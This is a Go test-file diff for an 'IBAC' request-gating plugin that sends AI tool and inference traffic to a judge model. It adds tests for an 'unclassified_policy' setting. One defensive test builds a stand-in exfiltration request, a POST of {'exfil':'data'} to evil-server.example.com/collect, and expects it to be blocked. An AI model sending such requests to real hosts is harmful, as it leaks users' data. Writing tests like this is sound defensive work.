@@ -301,7 +301,18 @@ func TestOnRequest_InferenceBypassByDefault(t *testing.T) {
 	p := newConfiguredIBAC(t, fj)
 
 	pctx := makePCtx(t)
-	pctx.Extensions.Inference = &pipeline.InferenceExtension{Model: "gpt-4o-mini"}
+	// Mirror what inference-parser does in production: every populated
+	// InferenceExtension is marked as an action. With makePCtx's default
+	// MCP{IsAction:true} and Inference{IsAction:true}, classification
+	// returns (anyAction:true, anyBypass:false), so the gate at step 4
+	// falls through to the step-5 inference-policy check that this test
+	// is actually exercising. Without IsAction:true, the test would
+	// short-circuit at step 4 with skip/protocol_mechanics and pass for
+	// the wrong reason.
+	pctx.Extensions.Inference = &pipeline.InferenceExtension{
+		Model:    "gpt-4o-mini",
+		IsAction: true,
+	}
 	action := invokeOnRequest(p, pctx)
 
 	if action.Type != pipeline.Continue {
@@ -309,6 +320,14 @@ func TestOnRequest_InferenceBypassByDefault(t *testing.T) {
 	}
 	if fj.calls != 0 {
 		t.Errorf("judge invoked on inference; want 0")
+	}
+	// Critical assertion: verify step 5 (inference_bypass) is the step
+	// that fired, not step 4 (protocol_mechanics). A regression in the
+	// inference-policy logic would otherwise pass silently.
+	inv := lastInvocation(t, pctx)
+	if inv.Reason != "inference_bypass" {
+		t.Errorf("Invocation reason = %q, want %q (step-5 inference policy must be the firing step)",
+			inv.Reason, "inference_bypass")
 	}
 }
 
@@ -500,6 +519,80 @@ func TestOnRequest_NoClassification_PassesThrough(t *testing.T) {
 	if pctx.Extensions.Invocations != nil &&
 		(len(pctx.Extensions.Invocations.Inbound)+len(pctx.Extensions.Invocations.Outbound)) > 0 {
 		t.Errorf("expected no invocations on pass-through; got %+v", pctx.Extensions.Invocations)
+	}
+}
+
+// Opt-in coverage of unclassified traffic via unclassified_policy:
+// "judge". The IBAC demo's plain-HTTP exfiltration scenario relies on
+// this branch — without it, raw http.Post outbound from a local
+// function-calling tool would pass through silently because no parser
+// claims it.
+func TestOnRequest_UnclassifiedPolicy_Judge(t *testing.T) {
+	fj := &fakeJudge{verdict: "deny", reason: "unrelated to user intent"}
+	p := NewIBAC()
+	cfg := `{"judge_endpoint":"http://j","judge_model":"m","unclassified_policy":"judge"}`
+	if err := p.Configure(json.RawMessage(cfg)); err != nil {
+		t.Fatalf("Configure: %v", err)
+	}
+	p.judge = fj
+
+	pctx := makePCtx(t)
+	pctx.Extensions.MCP = nil // unclassified — no parser populated anything
+	pctx.Method = "POST"
+	pctx.Host = "evil-server.example.com"
+	pctx.Path = "/collect"
+	pctx.Body = []byte(`{"exfil":"data"}`)
+
+	action := invokeOnRequest(p, pctx)
+
+	if action.Type != pipeline.Reject {
+		t.Errorf("got %v, want Reject (unclassified_policy=judge must reach the judge and apply its verdict)", action.Type)
+	}
+	if fj.calls != 1 {
+		t.Errorf("judge calls = %d, want 1 (unclassified must reach judge under policy=judge)", fj.calls)
+	}
+	inv := lastInvocation(t, pctx)
+	if inv.Reason != "blocked" {
+		t.Errorf("Invocation reason = %q, want 'blocked'", inv.Reason)
+	}
+}
+
+// Configure-time validation of unclassified_policy.
+func TestConfigure_UnclassifiedPolicy_DefaultsToPassthrough(t *testing.T) {
+	p := NewIBAC()
+	if err := p.Configure(json.RawMessage(`{"judge_endpoint":"http://j","judge_model":"m"}`)); err != nil {
+		t.Fatalf("Configure: %v", err)
+	}
+	if p.cfg.UnclassifiedPolicy != UnclassifiedPolicyPassthrough {
+		t.Errorf("default UnclassifiedPolicy = %q, want %q",
+			p.cfg.UnclassifiedPolicy, UnclassifiedPolicyPassthrough)
+	}
+}
+
+func TestConfigure_UnclassifiedPolicy_RejectsUnknownValue(t *testing.T) {
+	p := NewIBAC()
+	cfg := `{"judge_endpoint":"http://j","judge_model":"m","unclassified_policy":"maybe"}`
+	err := p.Configure(json.RawMessage(cfg))
+	if err == nil {
+		t.Fatal("expected error for unknown unclassified_policy value")
+	}
+	if !strings.Contains(err.Error(), "unclassified_policy") {
+		t.Errorf("error should mention unclassified_policy; got %q", err.Error())
+	}
+}
+
+func TestConfigure_UnclassifiedPolicy_AcceptsExplicitValues(t *testing.T) {
+	for _, v := range []string{"passthrough", "judge"} {
+		t.Run(v, func(t *testing.T) {
+			p := NewIBAC()
+			cfg := fmt.Sprintf(`{"judge_endpoint":"http://j","judge_model":"m","unclassified_policy":%q}`, v)
+			if err := p.Configure(json.RawMessage(cfg)); err != nil {
+				t.Fatalf("Configure(%q): %v", v, err)
+			}
+			if p.cfg.UnclassifiedPolicy != v {
+				t.Errorf("UnclassifiedPolicy = %q, want %q", p.cfg.UnclassifiedPolicy, v)
+			}
+		})
 	}
 }
 
